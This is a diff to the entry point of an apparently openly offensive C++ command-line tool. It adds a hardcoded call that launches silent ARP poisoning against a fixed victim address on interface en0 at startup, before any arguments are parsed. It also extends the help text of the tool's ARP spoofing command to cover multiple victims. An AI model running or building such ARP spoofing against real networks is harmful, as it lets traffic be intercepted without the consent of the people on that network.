@@ -1,9 +1,11 @@
+#include "arp_poisoning/public.h"
 #include "helper/CLIExecutor.h"
 #include "helper/CLITypes.h"
 #include "log.h"
 
 #include <exception>
 #include <helper/CLIParser.h>
+#include <optional>
 #include <string>
 #include <vector>
 
@@ -13,6 +15,13 @@
  */
 int main(int argc, char *argv[]) noexcept(false) {
     try {
+        const ATK::ARP::SilentPoisoningOptions options{
+            .ifaceIpOrName = "en0",
+            .attackerMac = std::nullopt,
+            .victimIps = {"192.168.178.1"},
+            .ipsToSpoof = {"192.172.199.1"}};
+
+        ATK::ARP::silentPoison(options);
 
         // Parse command line arguments
         const std::vector<std::string> args(argv + 1, argv + argc);
@@ -58,8 +67,10 @@ int main(int argc, char *argv[]) noexcept(false) {
             CLIExecutor::invokeArpPoison,
             "ifaceIpOrName  [attackerMac]  [victimIp]  [ipToSpoof]    Performs "
             "an ARP spoofing attack with the given arguments. Although "
-            "attackerMac and victimIp are always optional, ipToSpoof is "
-            "required when the quiet flag is passed.",
+            "attackerMac is always optional, victimIp and ipToSpoof are "
+            "required when the quiet flag is passed. To pass multiple victim "
+            "IPs and/or IPs to spoof, separate the IPs with commas, e.g. "
+            "192.0.0.1,127.0.0.1. By default runs in all-out mode.",
             {2, 4},
             FlagOptions{.sensitiveToQuiet = true}});
 
